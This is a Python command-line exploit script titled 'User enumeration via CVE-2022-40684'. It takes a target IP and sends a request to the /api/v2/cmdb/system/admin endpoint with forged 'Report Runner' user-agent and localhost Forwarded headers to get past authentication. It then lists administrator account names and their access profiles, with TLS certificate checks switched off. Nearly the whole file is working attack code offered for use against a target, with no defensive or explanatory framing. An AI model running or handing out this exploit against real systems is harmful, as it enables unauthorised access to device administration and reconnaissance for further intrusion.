#!/usr/bin/env python3

import requests
import urllib3
import json
import sys
import getopt
from prettytable import PrettyTable

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def usage():
    print('usage: python3 UserEnum.py -t IP_Address\n')
    
def banner():
    print('\n+-------------------------------------+')
    print('| User enumeration via CVE-2022-40684 |')
    print('+-------------------------------------+\n')

def main(argv):
    if len(sys.argv) < 2:
        banner()
        usage()
    try:
        opts, args = getopt.getopt(argv,"ht:")
    except getopt.GetoptError:
        banner()
        usage()
    for opt, arg in opts:
        if opt == '-h':
            banner()
            usage()
        if opt == '-t':
            target = arg
            banner()
            exploit(target)
    sys.exit()

def exploit(target):
    headers = {
        'Host': target,
        'User-Agent': 'Report Runner',
        'Forwarded': 'for=[127.0.0.1]:8000;by=[127.0.0.1]:9000;',
    }
    response = json.loads((requests.get('https://'+target+'/api/v2/cmdb/system/admin', headers=headers, verify=False)).text)

    table = PrettyTable(['Name', 'Profile'])
    for user in range(len(response['results'])):
        table.add_row([response['results'][user]['name'], response['results'][user]['accprofile']])
    print(table,'\n')

if __name__ == "__main__":
    try:
        main(sys.argv[1:])
    except KeyboardInterrupt:
        print('Interrupted by users...')
    except:
        sys.exit()
